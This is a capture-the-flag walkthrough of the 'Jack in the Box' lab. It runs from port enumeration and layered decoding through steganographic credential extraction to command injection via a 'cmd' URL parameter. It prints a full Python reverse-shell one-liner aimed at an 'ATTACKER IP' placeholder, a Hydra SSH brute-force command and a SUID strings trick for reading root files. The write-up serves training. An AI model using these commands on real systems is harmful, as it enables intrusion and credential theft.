Jack in the Box — CTF Walkthrough
1. Initial Enumeration

I began with an Nmap scan, which revealed an unusual configuration:

22 (HTTP)
80 (SSH)

<img width="771" height="246" alt="Nmap scan" src="https://github.com/user-attachments/assets/f3733651-90d8-42ac-8822-3943600d2656" />

This port inversion was a nice quirk of the challenge.
Navigating to port 22 in the browser, I found the website themed around Jack, while port 80 was hosting SSH.

<img width="1916" height="959" alt="Website" src="https://github.com/user-attachments/assets/82427b98-c1b0-4cfe-b196-eb9e4f5309d4" />

2. Discovering Hidden Paths

Using Inspect Element, I noticed a reference to a hidden page:
/recovery.php

Alongside it was a Base64-encoded string. I decoded this in CyberChef, revealing what looked like a password, however, it did not work on the recovery login page.

<img width="1220" height="420" alt="inspect on main page" src="https://github.com/user-attachments/assets/b0f677fe-8520-4218-a89a-979be63e7887" />
<img width="1537" height="586" alt="cyberchef-1" src="https://github.com/user-attachments/assets/9ecb62d2-78ea-4ad3-ba79-e387228e0d1b" />


3. Digging Into recovery.php

I checked the page source of /recovery.php and found another encoded string. 

<img width="1916" height="431" alt="recoveryphp" src="https://github.com/user-attachments/assets/d0b0a9c6-40bb-4831-948e-373b420bea89" />

Trying to decode it revealed:

Base32 → produced a hex string

Hex → decoded into a ROT13 string

ROT13 → revealed the hidden message:

“Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S”

This strongly suggested the password was concealed within one of the site’s images.

<img width="1534" height="595" alt="cyberchef-2" src="https://github.com/user-attachments/assets/3c002510-94ce-4874-b236-39848a1fe00d" />

he hint provided earlier — bit.ly/2TvYQ2S — redirected to a wikipedia page of a dinosaur species. This wasn’t directly useful, but it suggested I should focus on images for the next stage. Because of the dinosaur reference, I initially targeted stego.jpg, assuming it was the intended file.

I attempted:

<img width="347" height="167" alt="stegseek" src="https://github.com/user-attachments/assets/87f81cd2-cca6-4685-ba2a-348910ea1436" />

This returned:

“Hehe. Gotcha! You're on the right path, but wrong image!”

So I moved on to header.jpg, using the decoded password and a different tool named steghide. This time, steghide successfully extracted a file named cms.creds, containing the credentials for /recovery.php.

<img width="383" height="185" alt="steghide" src="https://github.com/user-attachments/assets/45930085-5e4f-4d33-86d6-6a1bf1e69896" />

5. Gaining Access & Achieving RCE

After authenticating to the recovery page, I saw this message:

"GET me a 'cmd' and I'll run it for you Future-Jack."

This hinted at a command injection/RCE vulnerability.

I tested it by appending a command parameter to the URL:

<img width="1357" height="40" alt="cmdinjct" src="https://github.com/user-attachments/assets/5ab19452-7fc9-49f2-bc74-0dd3c0aa1b90" />

A directory listing appeared—RCE confirmed.

<img width="609" height="40" alt="listing" src="https://github.com/user-attachments/assets/f6410945-7ba9-47fe-a869-b16717af31d2" />

Next, I executed a Python reverse shell payload in the url, which successfully connected back to my machine, granting me a shell on the target.

"export RHOST="ATTACKER IP";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"

<img width="531" height="133" alt="revshell" src="https://github.com/user-attachments/assets/b1a166c5-5460-459c-a295-7faa49379b73" />

6. Enumerating the System

Inside /home, I discovered jacks_password_list, which contained a list of possible SSH passwords for user jack.

I copied the file to my machine and used Hydra to brute-force SSH:

hydra -l jack -P jacks_password_list ssh://<IP>

Hydra identified the correct password, and I logged in as jack.

<img width="954" height="209" alt="hydra" src="https://github.com/user-attachments/assets/d1f4c7eb-f67b-4420-936f-d85cb15b5a3c" />

In Jack’s home directory, I found user.jpg.
After transferring it using scp, opening the file revealed the user flag.

<img width="913" height="113" alt="scp" src="https://github.com/user-attachments/assets/2796d375-5470-424e-933e-c67a1475b578" />
<img width="1145" height="523" alt="user" src="https://github.com/user-attachments/assets/ae84b572-d94d-4756-a9ca-04e1ab7def4f" />

7. Privilege Escalation

To escalate privileges, I first checked sudo permissions:

"sudo -l"

Jack had no sudo access.
Next, I searched for SUID binaries:

"find / -type f -user root -perm -u=s 2>/dev/null"

One interesting result was:

/usr/bin/strings

Since strings was running with root privileges, I used it to read the root flag directly:

"strings /root/root.txt"

This printed the root flag, completing the challenge.

<img width="611" height="276" alt="strings binary" src="https://github.com/user-attachments/assets/fe6c08fb-e655-4769-9caf-1b99e267d6aa" />
<img width="754" height="135" alt="root flag" src="https://github.com/user-attachments/assets/b99427f4-611b-4223-a082-8d1a00d35e7a" />

